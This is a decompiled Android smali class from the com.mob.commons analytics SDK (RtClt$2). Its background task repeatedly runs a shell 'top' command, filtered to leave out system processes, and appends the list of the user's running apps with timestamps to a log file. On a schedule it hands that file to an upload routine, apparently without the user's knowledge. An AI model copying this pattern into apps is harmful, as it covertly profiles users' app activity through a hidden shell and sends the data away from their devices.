.class Lcom/mob/commons/clt/RtClt$2;
.super Ljava/lang/Object;
.source "RtClt.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/mob/commons/clt/RtClt;->b()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/io/File;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Ljava/util/HashMap;

.field final synthetic d:Lcom/mob/commons/clt/RtClt;


# direct methods
.method constructor <init>(Lcom/mob/commons/clt/RtClt;Ljava/io/File;Ljava/lang/String;Ljava/util/HashMap;)V
    .registers 5

    .prologue
    .line 90
    iput-object p1, p0, Lcom/mob/commons/clt/RtClt$2;->d:Lcom/mob/commons/clt/RtClt;

    iput-object p2, p0, Lcom/mob/commons/clt/RtClt$2;->a:Ljava/io/File;

    iput-object p3, p0, Lcom/mob/commons/clt/RtClt$2;->b:Ljava/lang/String;

    iput-object p4, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 10

    .prologue
    const-wide/16 v4, 0x0

    .line 93
    :try_start_2
    invoke-static {}, Lcom/mob/commons/a;->b()Z

    move-result v0

    if-eqz v0, :cond_136

    .line 94
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->a:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_15

    .line 95
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->a:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->createNewFile()Z

    .line 98
    :cond_15
    invoke-static {}, Lcom/mob/commons/a;->a()J

    move-result-wide v6

    .line 99
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "top -d 0 -n 1 | grep -E -v \'root|shell|system\' >> "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " && echo \""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "======================"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\" >> "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 101
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v2, "os"

    invoke-virtual {v0, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/io/OutputStream;

    .line 102
    const-string v2, "ascii"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    .line 103
    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v2, "firstLog"

    invoke-virtual {v1, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "true"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    .line 104
    if-eqz v1, :cond_137

    .line 105
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "echo \""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "_0\" >> "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/mob/commons/clt/RtClt$2;->b:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 106
    iget-object v2, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v3, "firstLog"

    const/4 v8, 0x0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    invoke-virtual {v2, v3, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 110
    :goto_a4
    const-string v2, "ascii"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    .line 111
    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V
    :try_end_b0
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_b0} :catch_179

    .line 115
    :try_start_b0
    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v2, "nextUploadTime"

    invoke-virtual {v1, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J
    :try_end_bf
    .catch Ljava/lang/Throwable; {:try_start_b0 .. :try_end_bf} :catch_16c

    move-result-wide v2

    .line 117
    :goto_c0
    cmp-long v1, v6, v2

    if-ltz v1, :cond_136

    .line 118
    :try_start_c4
    const-string v1, "exit\n"

    const-string v2, "ascii"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V

    .line 119
    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V

    .line 120
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V

    .line 121
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v1, "p"

    invoke-virtual {v0, v1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Process;

    .line 122
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    .line 123
    invoke-virtual {v0}, Ljava/lang/Process;->destroy()V

    .line 124
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->d:Lcom/mob/commons/clt/RtClt;

    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->b:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/mob/commons/clt/RtClt;->a(Lcom/mob/commons/clt/RtClt;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_110

    .line 125
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->d:Lcom/mob/commons/clt/RtClt;

    invoke-static {v0}, Lcom/mob/commons/clt/RtClt;->b(Lcom/mob/commons/clt/RtClt;)J

    move-result-wide v0

    .line 126
    cmp-long v2, v0, v4

    if-lez v2, :cond_104

    .line 127
    iget-object v2, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v3, "nextUploadTime"

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-virtual {v2, v3, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 129
    :cond_104
    iget-object v0, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v1, "firstLog"

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 131
    :cond_110
    const-string v0, "comm/tags/.rcTag"

    invoke-static {v0}, Lcom/mob/commons/c;->b(Ljava/lang/String;)V
    :try_end_115
    .catch Ljava/lang/Throwable; {:try_start_c4 .. :try_end_115} :catch_179

    .line 133
    :try_start_115
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "sh"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 134
    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v2, "p"

    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 135
    iget-object v1, p0, Lcom/mob/commons/clt/RtClt$2;->c:Ljava/util/HashMap;

    const-string v2, "os"

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_131
    .catch Ljava/lang/Throwable; {:try_start_115 .. :try_end_131} :catch_170

    .line 139
    :goto_131
    :try_start_131
    const-string v0, "comm/tags/.rcTag"

    invoke-static {v0}, Lcom/mob/commons/c;->c(Ljava/lang/String;)V

    .line 145
    :cond_136
    :goto_136
    return-void

    .line 108
    :cond_137
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "echo \""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "_"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-static {}, Lcom/mob/commons/a;->c()I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\" >> "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/mob/commons/clt/RtClt$2;->b:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_a4

    .line 116
    :catch_16c
    move-exception v1

    move-wide v2, v4

    goto/16 :goto_c0

    .line 136
    :catch_170
    move-exception v0

    .line 137
    invoke-static {}, Lcom/mob/tools/MobLog;->getInstance()Lcom/mob/tools/log/NLog;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/mob/tools/log/NLog;->w(Ljava/lang/Throwable;)I
    :try_end_178
    .catch Ljava/lang/Throwable; {:try_start_131 .. :try_end_178} :catch_179

    goto :goto_131

    .line 142
    :catch_179
    move-exception v0

    .line 143
    invoke-static {}, Lcom/mob/tools/MobLog;->getInstance()Lcom/mob/tools/log/NLog;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/mob/tools/log/NLog;->d(Ljava/lang/Throwable;)I

    goto :goto_136
.end method
